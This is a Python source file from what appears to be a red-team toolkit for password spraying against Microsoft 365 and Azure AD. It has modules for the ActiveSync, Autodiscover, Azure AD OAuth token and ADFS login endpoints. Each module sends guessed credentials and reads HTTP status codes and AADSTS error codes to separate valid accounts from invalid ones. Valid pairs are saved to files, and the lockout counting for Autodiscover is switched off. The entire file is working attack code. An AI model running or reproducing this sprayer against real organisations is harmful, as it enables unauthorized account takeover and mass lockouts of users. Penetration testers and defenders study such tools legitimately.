#!/usr/bin/env python3

# Based on: https://bitbucket.org/grimhacker/office365userenum/
#           https://github.com/Raikia/UhOh365
#           https://github.com/dafthack/MSOLSpray
#           '-> https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f
#           https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py

import re
import time
import urllib3
import asyncio
import requests
import concurrent.futures
import concurrent.futures.thread
from functools import partial
from requests.auth import HTTPBasicAuth
from core.utils.config import *
from core.utils.helper import *
from core.utils.colors import text_colors
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Sprayer:

    valid_creds  = []  # Valid credentials storage
    tested_creds = []  # Tested credentials storage
    helper = Helper()  # Helper functions

    def __init__(self, loop, userlist, args):
        self.args       = args
        self.loop       = loop
        self.lockout    = 0
        self.userlist   = userlist
        self.proxies    = None if not self.args.proxy else {
            "http": self.args.proxy, "https": self.args.proxy
        }
        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.args.rate
        )
        # Spray Modules
        self._modules = {
            'autodiscover': self._autodiscover,
            'activesync':   self._activesync,
            'msol':         self._msol,
            'adfs':         self._adfs
        }


    def shutdown(self, key=False):
        # Print new line after ^C
        msg  = '\n\n[*] Writing valid credentials found to file \'%s/spray/valid_users\'...' % self.args.output
        msg += '\n[*] Please see %s/spray/sprayed_creds.txt for all spray attempts.' % self.args.output
        if key:
            msg = '\n[!] CTRL-C caught.' + msg
        print(msg)

        # https://stackoverflow.com/a/48351410
        # https://gist.github.com/yeraydiazdiaz/b8c059c6dcfaf3255c65806de39175a7
        # Unregister _python_exit while using asyncio
        # Shutdown ThreadPoolExecutor and do not wait for current work
        import atexit
        atexit.unregister(concurrent.futures.thread._python_exit)
        self.executor.shutdown = lambda wait:None

        # Write the tested creds
        self.helper.write_tested(self.tested_creds, "%s/spray/sprayed_creds.txt" % (self.args.output))

        # Write the valid accounts
        self.helper.write_data(self.valid_creds, "%s/spray/valid_users.txt" % (self.args.output))


    """ Template for HTTP Request """
    def _send_request(self, request, url, auth=None, data=None, headers=Config.headers):
        return request(  # Send HTTP request
            url,
            auth=auth,
            data=data,
            headers=headers,
            proxies=self.proxies,
            timeout=self.args.timeout,
            allow_redirects=False,
            verify=False
        )


    """ Asyncronously Send HTTP Requests """
    async def run(self, password):
        blocking_tasks = [
            self.loop.run_in_executor(self.executor, partial(self._modules[self.args.spray_type], user=user, password=password))
            for user in self.userlist
        ]
        if blocking_tasks:
            await asyncio.wait(blocking_tasks)


    """ Asyncronously Send HTTP Requests """
    async def run_paired(self, passlist):
        blocking_tasks = [
            self.loop.run_in_executor(self.executor, partial(self._modules[self.args.spray_type], user=user, password=password))
            for user, password in zip(self.userlist, passlist)
        ]
        if blocking_tasks:
            await asyncio.wait(blocking_tasks)


    # =============================
    # == -- AcitveSync MODULE -- ==
    # =============================

    """ Spray users on Microsoft using Microsoft Server ActiveSync
        https://bitbucket.org/grimhacker/office365userenum/ """
    def _activesync(self, user, password):
        try:
            # Add special header for ActiveSync
            headers = Config.headers  # Grab external headers from config.py
            headers["MS-ASProtocolVersion"] = "14.0"

            # Build email if not already built
            email = self.helper.check_email(user, self.args.domain)

            # Keep track of tested names in case we ctrl-c
            self.tested_creds.append('%s:%s' % (email, password))

            time.sleep(0.250)

            auth     = HTTPBasicAuth(email, password)
            url      = "https://outlook.office365.com/Microsoft-Server-ActiveSync"
            response = self._send_request(requests.options, url, auth=auth, headers=headers)
            status   = response.status_code

            # Note: 403 responses no longer indicate that an authentication attempt was valid, but now indicates
            #       invalid authentication attempts (whether it be invalid username or password). 401 responses
            #       also indicate an invalid authentication attempt
            if status == 200:
                print("[%sVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
                self.valid_creds.append('%s:%s' % (email, password))
                self.userlist.remove(user)  # Remove valid user from being sprayed again

            else:
                print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')

        except Exception as e:
            if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
            pass


    # ===============================
    # == -- Autodiscover MODULE -- ==
    # ===============================

    """ Spray users on Microsoft using Microsoft Autodiscover
        https://github.com/Raikia/UhOh365 """
    def _autodiscover(self, user, password):
        try:
            # Check if we hit our locked account limit, and stop
            if self.lockout >= self.args.safe:
                return

            # Build email if not already built
            email = self.helper.check_email(user, self.args.domain)

            # Keep track of tested names in case we ctrl-c
            self.tested_creds.append('%s:%s' % (email, password))

            time.sleep(0.250)

            auth     = HTTPBasicAuth(email, password)
            url      = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
            response = self._send_request(requests.get, url, auth=auth)
            status   = response.status_code

            if status == 200:
                print("[%sVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
                self.valid_creds.append('%s:%s' % (email, password))
                self.userlist.remove(user)  # Remove valid user from being sprayed again

            elif status == 456:
                msg = password + " (Manually confirm [MFA, Locked, etc.])"
                print("[%sFOUND_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
                self.valid_creds.append('%s:%s' % (email, password))
                self.userlist.remove(user)  # Remove valid user from being sprayed again

            else:
                # Handle Autodiscover errors that are returned by the server
                if "X-AutoDiscovery-Error" in response.headers.keys():

                    # Handle Basic Auth blocking
                    basic_errors = [
                        "Basic Auth Blocked",
                        "BasicAuthBlockStatus - Deny",
                        "BlockBasicAuth - User blocked"
                    ]
                    if any(_str in response.headers["X-AutoDiscovery-Error"] for _str in basic_errors):
                        msg = password + " (Basic Auth blocked for this user. Removing from spray rotation.)\n"
                        print("[%sBLOCKED%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, msg, self.helper.space), end='\r')
                        self.userlist.remove(user)  # Remove basic auth blocked user from being sprayed again

                    else:

                        # Handle AADSTS errors - remove user from future rotations
                        if any(code in response.headers["X-AutoDiscovery-Error"] for code in Config.AADSTS_codes.keys()):
                            # This is where we handle lockout termination
                            # Note: It appears that Autodiscover is now showing lockouts on accounts that are valid that failed
                            #       authentication so we ignore this handling for now.
                            if code == "AADSTS50053":
                                self.lockout += 0  # 1  # Keep track of locked accounts seen

                            err = Config.AADSTS_codes[code][0]
                            msg = password + " (%s. Removing from spray rotation.)\n" % (Config.AADSTS_codes[code][1])
                            print("[%s%s%s]%s%s:%s%s" % (text_colors.red, err, text_colors.reset, Config.AADSTS_codes[code][2], email, msg, self.helper.space), end='\r')
                            self.userlist.remove(user)

                        else:
                            print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')

                else:
                    print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')

        except Exception as e:
            if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
            pass


    # =======================
    # == -- MSOL MODULE -- ==
    # =======================

    """ Spray users on Microsoft using Azure AD
        https://github.com/dafthack/MSOLSpray
        https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f """
    def _msol(self, user, password):
        try:
            # Check if we hit our locked account limit, and stop
            if self.lockout >= self.args.safe:
                return

            # Build email if not already built
            email = self.helper.check_email(user, self.args.domain)

            # Keep track of tested names in case we ctrl-c
            self.tested_creds.append('%s:%s' % (email, password))

            time.sleep(0.250)

            headers = Config.headers  # Grab external headers from config.py
            headers['Accept']       = 'application/json',
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            data = {
                'resource':   'https://graph.windows.net',
                'client_id':   '1b730954-1685-4b74-9bfd-dac224a7b894',
                'client_info': '1',
                'grant_type':  'password', 
                'username':    email,  # TODO: Do we want username or email here...
                'password':    password,
                'scope':       'openid'
            }

            url      = "https://login.microsoft.com/common/oauth2/token"        
            response = self._send_request(requests.post, url, data=data, headers=headers)
            status   = response.status_code

            if status == 200:
                print("[%sVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
                self.valid_creds.append('%s:%s' % (email, password))
                self.userlist.remove(user)  # Remove valid user from being sprayed again

            else:
                body  = response.json()
                error = body['error_description'].split('\r\n')[0]

                # Handle AADSTS errors - remove user from future rotations
                if any(code in error for code in Config.AADSTS_codes.keys()):
                    # This is where we handle lockout termination
                    # For now, we will just stop future sprays if a single lockout is hit
                    if code == "AADSTS50053":
                        self.lockout += 1  # Keep track of locked accounts seen

                    err = Config.AADSTS_codes[code][0]
                    msg = password + " (%s. Removing from spray rotation.)\n" % (Config.AADSTS_codes[code][1])
                    print("[%s%s%s]%s%s:%s%s" % (text_colors.red, err, text_colors.reset, Config.AADSTS_codes[code][2], email, msg, self.helper.space), end='\r')
                    self.userlist.remove(user)

                else:
                    print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')

        except Exception as e:
            if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
            pass


    # =======================
    # == -- ADFS MODULE -- ==
    # =======================

    """ Spray users via a managed ADFS server
        https://github.com/Mr-Un1k0d3r/RedTeamScripts/blob/master/adfs-spray.py """
    def _adfs(self, user, password):
        try:
            headers = Config.headers  # Grab external headers from config.py

            # Build email if not already built
            email = self.helper.check_email(user, self.args.domain)

            # Keep track of tested names in case we ctrl-c
            self.tested_creds.append('%s:%s' % (email, password))

            # Fix the ADFS URL for each user since the AuthUrl was pulled during validation using a
            # bogus user
            adfs_url = re.sub('username=user', f'username={user}', self.args.adfs)

            time.sleep(0.250)

            data     = "UserName=%s&Password=%s&AuthMethod=FormsAuthentication" % (email, password)
            url      = adfs_url
            response = self._send_request(requests.post, url, data=data, headers=headers)
            status   = response.status_code

            if status == 302:
                print("[%sVALID_CREDS%s]\t\t%s:%s%s" % (text_colors.green, text_colors.reset, email, password, self.helper.space))
                self.valid_creds.append('%s:%s' % (email, password))
                self.userlist.remove(user)  # Remove valid user from being sprayed again

            else:
                print("[%sINVALID%s]\t\t%s:%s%s" % (text_colors.red, text_colors.reset, email, password, self.helper.space), end='\r')

        except Exception as e:
            if self.args.debug: print("\n[ERROR]\t\t\t%s" % e)
            pass
